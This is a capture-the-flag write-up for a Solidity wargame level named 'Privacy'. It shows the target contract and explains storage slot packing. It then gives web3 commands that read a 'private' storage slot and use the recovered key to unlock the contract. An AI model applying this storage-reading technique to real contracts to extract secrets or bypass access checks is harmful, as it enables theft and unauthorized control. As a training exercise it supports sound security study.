# 12. Privacy

The creator of this contract was careful enough to protect the sensitive areas of its storage.

Unlock this contract to beat the level.

## Target contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

## Vulnerability

As before, there is no privacy on blockchain. Even though the state variable `data` is private in the code, anyone can read its storage slot to get its value.
When allocating storage slots solidity will merge variables into the same storage slot when possible.

In that case :

| State Variable |   Size   | Storage Slot |
|:--------------:|:--------:|:------------:|
|     locked     |  8 bits  |       0      |
|       ID       | 256 bits |       1      |
|   flattening   |  8 bits  |       2      |
|  denomination  |  8 bits  |       2      |
|   awkwardness  |  16 bits |       2      |
|     data[0]    | 256 bits |       3      |
|     data[1]    | 256 bits |       4      |
|     data[2]    | 256 bits |       5      |


So we first need to read storage slot 5 :

```js
await web3.eth.getStorageAt(contract.address, 5);
// 0xd8e3ce9566999c1b45297e306d44eeda4e9afa62ea7c6108e93e1ba67704988f
```

Solidity casting on bytes is pretty straight forward, when casting from `bytes32` to `bytes16` it will only select the first 16 bytes.
The value that we are looking for is : `0xd8e3ce9566999c1b45297e306d44eeda`.

We can unlock the contract easily :

```js
await contract.unlock("0xd8e3ce9566999c1b45297e306d44eeda")
```

And win the challenge.